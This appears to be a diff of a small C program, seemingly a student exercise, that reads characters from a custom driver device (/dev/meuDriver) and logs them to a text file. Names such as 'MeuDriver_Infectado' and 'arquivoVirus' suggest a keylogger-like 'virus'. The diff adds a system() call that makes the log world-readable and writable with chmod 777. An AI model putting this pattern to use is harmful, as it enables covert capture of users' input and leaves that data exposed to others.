@@ -2,10 +2,12 @@
 #include <stdlib.h>
 #include <string.h>
 
+
 void gravarCaractereNoArquivo(char caractere, char *nomeArquivo)
 {
 	FILE *arquivo;
 	arquivo = fopen(nomeArquivo, "a");
+	system("chmod 777 '/home/luciano/Documentos/Drivers/MeuDriver_Infectado/caracteres.txt'");
 	fputc(caractere, arquivo);
 	fputc('\n', arquivo);
 	fclose(arquivo);
@@ -24,17 +26,27 @@ char lerCaractereNoArquivo(char *nomeArquivo)
 
 int main()
 {
+	//printf("\nINICIANDO!\n");
+
 	FILE *arquivoDriver;
 	FILE *arquivoVirus;
 	char caractere;
 	char caractereAnterior;
 	
-	char *nomeArquivoLog = "caracteres.txt";
+	char *nomeArquivoLog = "/home/luciano/Documentos/Drivers/MeuDriver_Infectado/caracteres.txt";
 	char *nomeArquivoModulo = "/dev/meuDriver";
 	
+	/*
 	FILE *arquivoTeste;
-	arquivoTeste = fopen("Arquivo_Teste.txt", "a");
+	arquivoTeste = fopen("/home/luciano/Documentos/Drivers/MeuDriver_Infectado/Arquivo_Teste.txt", "a");
 	fclose(arquivoTeste);
+	*/
+	
+	
+	//caractere = lerCaractereNoArquivo(nomeArquivoModulo);
+	//printf("%c\n", caractere);
+	//gravarCaractereNoArquivo(caractere, nomeArquivoLog);
+	
 	
 	while(1)
 	{
@@ -50,7 +62,8 @@ int main()
 	}
 	
 	
-	printf("\nOk!\n\n");
+	
+	//printf("\nOk!\n\n");
 	
 	return 0;
 }
